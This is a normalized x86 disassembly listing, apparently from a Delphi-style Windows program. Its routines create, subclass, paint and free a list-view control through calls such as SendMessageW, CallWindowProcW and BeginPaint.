call sub_4a81f0
mov eax [ eax + 0x8 ]
lea ecx [ ebp - 0x4c ]
mov edx esi
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x4c ]
call sub_4a8c04
inc eax
add [ ebp - 0x18 ] eax
add [ ebp - 0x18 ] 0x2
inc esi
dec ebx
jne r-xdata
inc [ ebp - 0x10 ]
dec [ ebp - 0x28 ]
jne r-xdata
inc ebx
xor esi esi
mov [ ebp - 0x24 ] eax
cmp [ ebp - 0x24 ] 0xff
jle r-xdata
sub eax 0x4
mov eax [ eax ]
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_4494dc
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
call sub_4a81f0
mov edi eax
mov eax [ edi + 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov edx esi
mov eax edi
call sub_4a8068
mov [ ebp - 0x1a ] ax
lea edx [ ebp - 0x1a ]
mov ecx 0x2
mov eax [ ebp - 0xc ]
call sub_427500
inc esi
dec ebx
jne r-xdata
movzx eax [ ebp - 0x24 ]
mov [ ebp - 0x2d ] al
lea edx [ ebp - 0x45 ]
mov ecx 0x19
mov eax [ ebp - 0xc ]
call sub_427500
mov ebx [ ebp - 0x4 ]
test ebx ebx
je r-xdata
mov [ ebp - 0x24 ] 0xff
lea eax [ ebp - 0x4 ]
call j_sub_44a5d8
mov edx eax
movzx eax [ ebp - 0x2d ]
mov ecx eax
add ecx ecx
mov eax [ ebp - 0xc ]
call sub_427500
mov eax [ ebp - 0x2c ]
mov eax [ eax + 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax ebx
sub eax 0xa
cmp [ eax ] 0x2
je r-xdata
inc [ ebp - 0x10 ]
dec [ ebp - 0x28 ]
jne r-xdata
inc ebx
xor esi esi
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_4494dc
mov ebx eax
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
call sub_4a81f0
mov [ ebp - 0x2c ] eax
mov eax [ ebp - 0x2c ]
mov eax [ eax + 0xc ]
mov [ ebp - 0x45 ] eax
mov eax [ ebp - 0x2c ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x3d ] eax
mov eax [ ebp - 0x2c ]
mov eax [ eax + 0x1c ]
mov [ ebp - 0x41 ] eax
mov eax [ ebp - 0x2c ]
mov eax [ eax + 0x28 ]
mov [ ebp - 0x31 ] eax
mov eax [ ebp - 0x2c ]
mov eax [ eax + 0x2c ]
mov [ ebp - 0x35 ] eax
mov eax [ ebp - 0x2c ]
mov eax [ eax + 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov [ ebp - 0x39 ] eax
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x2c ]
mov edx [ edx + 0x20 ]
call sub_449d80
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
test eax eax
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
mov [ ebp - 0x24 ] eax
cmp [ ebp - 0x24 ] 0xff
jle r-xdata
sub eax 0x4
mov eax [ eax ]
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_4494dc
lea edx [ ebp - 0x24 ]
mov ecx 0x1
mov eax [ ebp - 0xc ]
call sub_427500
mov edi [ ebp - 0x4 ]
test edi edi
je r-xdata
mov [ ebp - 0x24 ] 0xff
lea eax [ ebp - 0x4 ]
call j_sub_44a5d8
mov edx eax
mov ecx [ ebp - 0x24 ]
add ecx ecx
mov eax [ ebp - 0xc ]
call sub_427500
inc esi
dec ebx
jne r-xdata
mov eax edi
sub eax 0xa
cmp [ eax ] 0x2
je r-xdata
lea ecx [ ebp - 0x4 ]
mov eax [ ebp - 0x2c ]
mov eax [ eax + 0x8 ]
mov edx esi
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_4494dc
mov edi eax
sub_4a8ffc
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor eax eax
push ebp
push sub_4a9086
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax edi
call sub_448180
test esi esi
jne r-xdata
add esp 0xfffffff0
call sub_448694
mov [ edi + 0x4 ] esi
xor edx edx
mov eax edi
call sub_4a90ac
xor edx edx
mov eax edi
call sub_4a90c0
mov dl 0x1
mov eax edi
call sub_4a90d4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4a908d
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_44be28
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_439c4c
call sub_448c38
sub_4a908d
mov eax edi
test bl bl
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4486ec
pop [ fs : 0x0 ]
add esp 0xc
sub_4a90e8
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
mov eax ebx
call sub_4a7a40
cmp [ eax + 0x34a ] 0x0
je r-xdata
mov eax [ esi + 0x20 ]
call sub_449db8
push eax
mov eax [ ebx + 0x20 ]
call sub_449db8
push eax
call lstrcmpW
mov [ ebp - 0x4 ] eax
push esi
mov eax [ ebp + 0x10 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
mov eax ebx
call sub_4a7a40
mov esi eax
mov eax ebx
call sub_4a7a40
mov edx eax
mov ecx ebx
mov eax [ esi + 0x34c ]
call [ esi + 0x348 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop esi
pop ebx
pop ecx
pop ebp
retn 0xc
sub_4a9154
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_490f20
mov eax [ r-xdata ]
not eax
and eax [ ebx + 0x50 ]
or eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
mov edx 0xfa
mov eax ebx
call sub_48d5f8
mov edx 0x96
mov eax ebx
call sub_48d62c
mov dl 0x1
mov eax ebx
call sub_4aa45c
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x13c ]
xor edx edx
mov eax ebx
call sub_48e174
mov dl 0x1
mov eax ebx
call sub_496b44
mov dl 0x1
mov eax ebx
call sub_4aa8cc
mov dl 0x1
mov eax ebx
call sub_4aa4e0
mov dl 0x1
mov eax ebx
call sub_4aa470
mov dl 0x1
mov eax [ r-xdata ]
call sub_46e0ac
mov esi eax
mov [ ebx + 0x268 ] esi
mov eax esi
mov edx ebx
call sub_48c730
mov [ ebx + 0x2c4 ] 0xffffffff
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4a7308
mov [ ebx + 0x29c ] eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4aff44
mov [ ebx + 0x3e0 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x110 ]
mov [ ebx + 0x28c ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10c ]
mov [ ebx + 0x2ec ] eax
mov [ ebx + 0x3e4 ] 0x0
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4a8ffc
mov [ ebx + 0x294 ] eax
mov eax [ r-xdata ]
push eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_425844
mov [ ebx + 0x2f0 ] eax
mov [ ebx + 0x2f4 ] 0x0
mov [ ebx + 0x2f5 ] 0x0
xor eax eax
mov [ ebx + 0x304 ] eax
mov [ ebx + 0x2d4 ] 0xffffffff
push 0x20
mov ecx 0x20
mov dl 0x1
mov eax [ r-xdata ]
call sub_44f180
mov [ ebx + 0x284 ] eax
push ebx
push sub_4a9f08
call sub_42f338
mov [ ebx + 0x3e8 ] eax
push ebx
push sub_4a9d48
call sub_42f338
mov [ ebx + 0x3ec ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_448180
mov esi eax
mov [ ebx + 0x2d8 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_4a9a58
mov dl 0x1
mov eax [ r-xdata ]
call sub_448180
mov esi eax
mov [ ebx + 0x2e0 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_4a9a58
mov dl 0x1
mov eax [ r-xdata ]
call sub_448180
mov esi eax
mov [ ebx + 0x2dc ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_4a9a58
mov dl 0x1
mov eax [ r-xdata ]
call sub_448180
mov esi eax
mov [ ebx + 0x2e4 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_4a9a58
mov [ ebx + 0x274 ] 0xffffffff
mov [ ebx + 0x300 ] 0x0
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_448694
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4486ec
pop [ fs : 0x0 ]
add esp 0xc
sub_4a9390
push ebx
push esi
call sub_44873c
mov ebx edx
mov esi eax
mov eax esi
call sub_496c14
test al al
je r-xdata
mov eax [ esi + 0x284 ]
call sub_4481b0
mov eax [ esi + 0x29c ]
call sub_4481b0
mov eax [ esi + 0x2ec ]
call sub_4481b0
mov eax [ esi + 0x3e0 ]
call sub_4481b0
mov eax [ esi + 0x28c ]
call sub_4481b0
mov eax [ esi + 0x294 ]
call sub_4481b0
mov eax [ esi + 0x2a0 ]
call sub_4481b0
mov eax [ esi + 0x2a8 ]
call sub_4481b0
mov eax [ esi + 0x2ac ]
call sub_4481b0
mov eax [ esi + 0x2f0 ]
call sub_4481b0
mov eax [ esi + 0x3e8 ]
call sub_42f3d0
mov eax [ esi + 0x2bc ]
test eax eax
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0xb4 ]
mov eax [ esi + 0x3ec ]
call sub_42f3d0
mov eax [ esi + 0x2d8 ]
call sub_4481b0
mov eax [ esi + 0x2dc ]
call sub_4481b0
mov eax [ esi + 0x2e4 ]
call sub_4481b0
mov eax [ esi + 0x2e0 ]
call sub_4481b0
mov eax [ esi + 0x268 ]
call sub_4481b0
xor eax eax
mov [ esi + 0x268 ] eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_49107c
test bl bl
jle r-xdata
mov edx [ esi + 0x2b4 ]
push edx
push 0xfffffffc
push eax
call SetWindowLongW
pop esi
pop ebx
retn
mov eax esi
call sub_4486e4
sub_4a94a8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax 0x1
call sub_4a37c8
mov edx esi
mov eax ebx
call sub_4926c0
mov ecx r-xdata
mov edx esi
mov eax ebx
call sub_4925ec
mov edx [ esi + 0x4 ]
or edx 0x2000000
movzx ecx [ ebx + 0x26d ]
or edx [ ecx * 4 + rw-data ]
movzx ecx [ ebx + 0x26c ]
or edx [ ecx * 4 + rw-data ]
mov eax [ ebx + 0x294 ]
movzx ecx [ eax + 0x8 ]
or edx [ ecx * 4 + rw-data ]
movzx ecx [ ebx + 0x26e ]
or edx [ ecx * 4 + rw-data ]
movzx ecx [ ebx + 0x288 ]
or edx [ ecx * 4 + rw-data ]
movzx ecx [ ebx + 0x298 ]
or edx [ ecx * 4 + rw-data ]
movzx ecx [ eax + 0x9 ]
or edx [ ecx * 4 + rw-data ]
movzx eax [ eax + 0xa ]
or edx [ eax * 4 + rw-data ]
movzx eax [ ebx + 0x28b ]
or edx [ eax * 4 + rw-data ]
movzx eax [ ebx + 0x28a ]
or edx [ eax * 4 + rw-data ]
or edx 0x40
mov [ esi + 0x4 ] edx
cmp [ ebx + 0x2a4 ] 0x0
je r-xdata
cmp [ ebx + 0x2a5 ] 0x0
je r-xdata
or [ esi + 0x4 ] 0x1000
cmp [ ebx + 0x1e1 ] 0x0
je r-xdata
or [ esi + 0x4 ] 0x400
and [ esi + 0x24 ] 0xfffffffc
pop esi
pop ebx
retn
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
cmp [ ebx + 0x26c ] 0x1
jne r-xdata
and [ esi + 0x4 ] 0xff7fffff
or [ esi + 0x8 ] 0x200
sub_4a95d4
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x2a8 ] 0x0
je r-xdata
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x29c ]
call sub_425430
push 0x400
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ eax + 0x2a8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_427d50
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4a965c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_42a7b4
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax + 0x29c ]
mov eax [ ebp - 0x4 ]
call sub_428be0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_4481b0
retn
sub_4a9688
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4927d4
mov eax [ ebp - 0x4 ]
call sub_4aa0b8
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x6c ]
mov eax [ ebp - 0x4 ]
call sub_4aa520
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x64 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_4aa4f4
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x2c0 ]
mov eax [ ebp - 0x4 ]
call sub_4aa56c
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x2d4 ]
mov eax [ ebp - 0x4 ]
call sub_4ad8e8
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2a0 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x29c ]
call sub_4a739c
mov eax [ ebp - 0x4 ]
call sub_496868
push 0x0
mov edx [ ebp - 0x4 ]
cmp [ edx + 0x3e4 ] 0x1
cmc
sbb edx edx
push edx
push 0x109d
push eax
call SendMessageW
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x270 ]
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28c ]
call sub_4a8304
mov eax [ ebp - 0x4 ]
mov [ eax + 0x2e9 ] 0x1
xor eax eax
push ebp
push sub_4a9802
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x29c ]
call sub_425430
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2a0 ]
mov edx [ ebp - 0x4 ]
call sub_42762c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2a0 ]
mov dl 0x1
mov ecx [ eax ]
call [ ecx - 0x4 ]
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x2a0 ] edx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2a4 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x278 ]
test ebx ebx
je r-xdata
mov eax ebx
call sub_44f2fc
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2cc ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x304 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28c ]
call sub_4a82a4
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x27c ]
test ebx ebx
je r-xdata
mov eax ebx
call sub_44f2fc
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
call sub_44f4cc
mov edx eax
xor ecx ecx
mov eax [ ebp - 0x4 ]
call sub_4a9a10
push ebp
call sub_4a95d4
pop ecx
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x64 ]
mov eax [ ebp - 0x4 ]
call sub_48e064
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x274 ]
cmp ebx 0xffffffff
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4aa1c0
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x280 ]
test ebx ebx
je r-xdata
mov eax ebx
call sub_44f2fc
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x278 ]
call sub_44f4cc
mov edx eax
mov ecx 0x1
mov eax [ ebp - 0x4 ]
call sub_4a9a10
mov eax [ ebp - 0x4 ]
call sub_4ad9f4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28c ]
call sub_4a84e8
mov eax [ ebp - 0x4 ]
mov [ eax + 0x2e9 ] 0x0
retn
mov edx ebx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28c ]
call sub_4a81f0
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_4ac550
mov eax [ ebp - 0x4 ]
call sub_4ac538
xor edx edx
call sub_4a7a80
mov eax [ ebp - 0x4 ]
call sub_4acfe0
call sub_44c2c8
call sub_44c3d4
test al al
je r-xdata
mov eax ebx
call sub_44f2fc
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x27c ]
call sub_44f4cc
mov edx eax
mov ecx 0x2
mov eax [ ebp - 0x4 ]
call sub_4a9a10
pop ebx
pop ecx
pop ebp
retn
mov eax [ rw-data ]
cmp [ eax ] 0x6
jl r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x280 ]
call sub_44f4cc
mov edx eax
mov ecx 0x3
mov eax [ ebp - 0x4 ]
call sub_4a9a10
push 0x0
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_496868
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sub_4a9a10
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_496c14
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_496868
mov ebx eax
push esi
push edi
push 0x1003
push ebx
call SendMessageW
sub_4a9a58
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax ebx
call sub_496c14
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edi esi
mov eax edi
call sub_44f2fc
test al al
je r-xdata
xor eax eax
mov eax edi
call sub_44f4cc
jmp r-xdata
cmp esi [ ebx + 0x278 ]
jne r-xdata
xor ecx ecx
mov edx eax
mov eax ebx
call sub_4a9a10
jmp r-xdata
cmp esi [ ebx + 0x270 ]
jne r-xdata
mov edx [ ebx + 0x27c ]
cmp esi edx
jne r-xdata
mov ecx 0x1
mov edx eax
mov eax ebx
call sub_4a9a10
jmp r-xdata
cmp edx esi
jne r-xdata
mov ecx 0x2
mov edx eax
mov eax ebx
call sub_4a9a10
jmp r-xdata
mov ecx 0x3
mov edx eax
mov eax ebx
call sub_4a9a10
sub_4a9ae0
push ebx
mov ebx eax
mov eax ebx
call sub_490858
mov eax ebx
call sub_496868
push 0x0
cmp [ ebx + 0x3e4 ] 0x1
cmc
sbb edx edx
push edx
push 0x109d
push eax
call SendMessageW
mov eax ebx
call sub_4ac8e8
pop ebx
retn
sub_4a9b14
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_492594
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp esi [ edi + 0x270 ]
jne r-xdata
cmp esi [ edi + 0x278 ]
jne r-xdata
xor edx edx
mov eax edi
call sub_4ac394
cmp esi [ edi + 0x27c ]
jne r-xdata
xor edx edx
mov eax edi
call sub_4ac408
cmp esi [ edi + 0x280 ]
jne r-xdata
xor edx edx
mov eax edi
call sub_4ac484
xor edx edx
mov eax edi
call sub_4ac318
sub_4a9b78
push ebp
mov ebp esp
push 0x0
push ebx
push esi
xor eax eax
push ebp
push sub_4a9cb2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x29c ]
call sub_4254d8
push eax
lea eax [ ebp - 0x4 ]
mov ecx 0x1
mov edx [ r-xdata ]
call sub_44b0f0
add esp 0x4
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_496868
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x29c ]
call sub_4254d8
mov esi eax
mov eax [ ebp - 0x4 ]
push eax
push esi
push 0x103b
push ebx
call SendMessageW
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x29c ]
mov edx [ eax ]
call [ edx + 0x20 ]
xor eax eax
push ebp
push sub_4a9c8f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x29c ]
call sub_4254d8
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x33a ] 0x0
je r-xdata
inc esi
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4a9c96
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x29c ]
mov edx [ eax ]
call [ edx + 0x24 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov [ eax + 0x2f5 ] 0x0
retn
mov eax [ ebp + 0x8 ]
mov ebx [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov eax [ ebx + 0x33c ]
call [ ebx + 0x338 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + ebx * 4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4adae8
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x14 ]
inc ebx
dec esi
jne r-xdata
sub_4a9cc0
push ebp
mov ebp esp
add esp 0xffffffe8
push esi
push edi
mov esi edx
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push 0x0
lea edx [ ebp - 0x4 ]
push edx
lea edx [ ebp - 0x18 ]
mov ecx 0x2
call sub_41d6cc
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4a9d38
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x4
mov eax [ ebp - 0x4 ]
push eax
push 0x318
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x2bc ]
push eax
call SendMessageW
lea edx [ ebp - 0x18 ]
mov cl 0xff
mov eax [ ebp - 0x8 ]
call sub_41d7e8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4a9d3f
or edx 0xffffffff
mov eax [ ebp - 0x8 ]
call sub_41d76c
retn
sub_4a9d48
push ebp
mov ebp esp
add esp 0xffffffbc
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push sub_4a9ee7
push [ fs : edx ]
mov [ fs : edx ] esp
mov esi [ ebx ]
mov eax esi
sub eax 0xf
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x254 ] 0x0
je r-xdata
sub eax 0x73
je r-xdata
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
mov eax [ ebx ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2bc ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2b4 ]
push eax
call CallWindowProcW
mov [ ebx + 0xc ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
call sub_41f780
test al al
je r-xdata
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2bc ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2b4 ]
push eax
call CallWindowProcW
mov [ ebx + 0xc ] eax
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x2bc ] edx
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x2b4 ] edx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub eax 0x2
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_477028
mov esi eax
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
sub eax 0x191
jne r-xdata
mov eax [ esi + 0x364 ]
call sub_483fc4
test al al
je r-xdata
mov [ ebx + 0xc ] 0xffffffff
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2f5 ] 0x0
je r-xdata
mov eax [ esi + 0x364 ]
mov edx [ ebp - 0x4 ]
call sub_483ffc
test al al
je r-xdata
push ebp
call sub_4a9b78
pop ecx
jmp r-xdata
lea eax [ ebp - 0x44 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2bc ]
push eax
call BeginPaint
xor edx edx
push ebp
push sub_4a9ea5
push [ fs : edx ]
mov [ fs : edx ] esp
push ebp
lea edx [ ebp - 0x3c ]
call sub_4a9cc0
pop ecx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x44 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2bc ]
push eax
call EndPaint
retn
sub_4a9f08
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4aa077
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
cmp eax 0xb04d
jg r-xdata
sub eax 0xbd00
je r-xdata
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x74 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub eax 0x2
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x300 ] 0x0
je r-xdata
add eax 0xffffff00
cmp eax 0x5
ja r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub eax 0x2
je r-xdata
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
mov eax [ ebx ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2b8 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2b0 ]
push eax
call CallWindowProcW
mov [ ebx + 0xc ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2b8 ]
push eax
call GetWindowRect
push 0x2
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2b8 ]
push eax
push 0x0
call MapWindowPoints
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2b8 ]
call sub_48ab7c
mov eax [ ebp - 0x4 ]
mov [ eax + 0x300 ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
jmp [ eax * 4 + jump_table_4a9f48 ]
sub eax 0x2
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4954f0
test al al
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_49570c
test al al
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_495630
test al al
je r-xdata
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_4aa098
push ebx
push esi
push edi
mov edi ecx
mov esi edx
call sub_496868
mov ebx eax
push edi
push esi
push 0x1015
push ebx
call SendMessageW
pop edi
pop esi
pop ebx
retn
sub_4aa0b8
push ebx
push esi
push edi
push ebp
mov ebx eax
mov eax ebx
call sub_496c14
test al al
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
xor edi edi
mov eax [ ebx + 0x27c ]
test eax eax
je r-xdata
mov esi 0x402
cmp [ ebx + 0x2cc ] 0x0
je r-xdata
mov edi eax
xor edx edx
mov eax ebx
call sub_4ac484
cmp [ ebx + 0x2cf ] 0x0
je r-xdata
or esi 0x4
cmp [ ebx + 0x2d0 ] 0x0
je r-xdata
or esi 0x1
cmp [ ebx + 0x2d2 ] 0x0
je r-xdata
or esi 0x8
cmp [ ebx + 0x2cd ] 0x0
je r-xdata
or esi 0x20
